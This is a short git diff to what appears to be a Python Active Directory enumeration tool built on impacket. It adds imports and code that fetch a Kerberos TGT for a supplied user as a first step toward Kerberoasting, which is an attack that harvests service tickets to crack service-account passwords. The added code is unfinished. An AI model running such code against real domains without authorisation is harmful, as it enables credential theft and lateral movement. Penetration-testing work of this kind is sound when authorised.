@@ -23,8 +23,10 @@ from binascii import hexlify
 import datetime, random
 
 # Thanks SecureAuthCorp for GetUserSPNs.py
-# For SPNUsers enum
+# For SPN enum
 from impacket.krb5.ccache import CCache
+from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+from impacket.ntlm import compute_lmhash, compute_nthash
 
 
 class EnumAD():
@@ -634,7 +636,24 @@ class EnumAD():
             spn = json.loads(self.spn[idx].entry_to_json())
             users_spn[self.splitJsonArr(spn['attributes'].get('name'))] = self.splitJsonArr(spn['attributes'].get('servicePrincipalName')) 
             idx += 1    
-        #print(users_spn)
+        print(users_spn.values())
+
+        # Get TGT for the supplied user
+        client = Principal(self.domuser, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        try:
+            tgt, cipher, oldSession, newSession = getKerberosTGT(client, '', self.server, compute_lmhash(self.passwd), compute_nthash(self.passwd), None, kdcHost=self.server)
+
+            TGT = {}
+            TGT['KDC_REP'] = tgt
+            TGT['cipher'] = cipher
+            TGT['sessionKey'] = newSession
+    
+            print(TGT)
+
+        except KerberosError as err:
+            print('[ ' + colored('NOT OK', 'red') +' ] Kerberoasting failed with error: {0}'.format(err.getErrorString()[1]))
+            # Todo: Fix
+            pass
 
 
 
